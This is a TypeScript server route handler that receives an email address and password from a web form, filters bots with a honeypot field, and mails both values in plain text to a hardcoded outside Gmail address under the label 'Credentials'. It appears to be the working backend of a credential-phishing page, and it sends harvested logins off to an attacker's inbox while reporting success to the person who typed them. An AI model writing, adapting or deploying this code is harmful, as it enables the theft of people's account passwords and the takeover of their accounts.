import nodemailer from 'nodemailer';

export async function POST(request: Request) {
  try {
    const { email, password, _honeypot } = await request.json();

    // Honeypot anti-bot trap
    if (_honeypot) {
      console.warn("🤖 Bot detected!", { email, password, _honeypot });
      return new Response(
        JSON.stringify({ message: 'Bot detected. Ignored.' }),
        { status: 200, headers: { 'Content-Type': 'application/json' } }
      );
    }

    // Validate fields
    if (!email || !password) {
      return new Response(
        JSON.stringify({ error: 'Missing required fields' }),
        { status: 400, headers: { 'Content-Type': 'application/json' } }
      );
    }

    // Setup nodemailer transporter
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD,
      },
    });

    // Define email content
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: 'vandulinus@gmail.com',
      subject: `New message from Your Page`,
      text: "Credentials",
      html: `
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong><br/>${password}</p>
      `,
    };

    // Send email
    await transporter.sendMail(mailOptions);

    return new Response(
      JSON.stringify({ success: true }),
      { status: 200, headers: { 'Content-Type': 'application/json' } }
    );

  } catch (error: any) {
    console.error('Email API error:', error.message);
    return new Response(
      JSON.stringify({ message: 'Error sending email', error: error.message }),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    );
  }
}
